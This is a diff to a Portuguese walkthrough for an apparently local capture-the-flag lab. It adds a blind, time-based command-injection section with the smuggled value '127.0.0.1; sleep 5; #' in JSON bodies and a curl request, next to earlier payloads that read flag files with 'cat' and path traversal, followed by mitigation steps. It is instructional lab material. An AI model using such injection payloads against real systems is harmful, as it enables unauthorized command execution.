@@ -10,6 +10,7 @@ http://127.0.0.1:8090
 
 ```text
 target: 127.0.0.1; cat /app/flags/flag1.txt
+target: 127.0.0.1; sleep 5; #
 target: localhost && cat /app/flags/flag2.txt
 file: ../flags/flag3.txt
 file: ../flags/flag4.txt
@@ -109,6 +110,65 @@ Mitigacao:
 - usar `execFile` ou `spawn` com argumentos separados;
 - validar allowlist de host/IP;
 - executar a aplicacao com privilegios minimos.
+
+## 1.1. Blind/Time-Based Command Injection no TCP Check
+
+O mesmo endpoint aceita um modo TCP legado. Ele deve ser montado manualmente no Burp Repeater, porque a UI continua enviando apenas o check visivel.
+
+Rota:
+
+```text
+POST /api/assets/check
+```
+
+Body normal TCP:
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "tcp",
+  "target": "127.0.0.1",
+  "port": "80"
+}
+```
+
+Body time-based:
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "tcp",
+  "target": "127.0.0.1; sleep 5; #",
+  "port": "80"
+}
+```
+
+Payload:
+
+```text
+target = 127.0.0.1; sleep 5; #
+```
+
+A resposta TCP nao retorna stdout/stderr. Ela retorna metadados, incluindo `durationMs`. Quando o payload com `sleep 5` faz a resposta demorar aproximadamente 5 segundos a mais que a requisicao controle, isso confirma blind command injection por canal de tempo.
+
+Exemplo curl opcional:
+
+```bash
+curl -s -b cookies.txt \
+  -H "Content-Type: application/json" \
+  -d '{"assetId":"gw-01","checkType":"tcp","target":"127.0.0.1; sleep 5; #","port":"80"}' \
+  http://127.0.0.1:8090/api/assets/check
+```
+
+Mitigacao:
+
+- nao usar `exec` com concatenacao;
+- usar `execFile` ou `spawn` com argumentos separados;
+- aplicar allowlist estrita de `checkType`;
+- validar `target` como IP/hostname permitido;
+- validar `port` como numero entre 1 e 65535;
+- nao confiar em campos tecnicos enviados pelo cliente;
+- manter timeout e isolamento do processo.
 
 ## 2. Resolver Legado Escondido
 
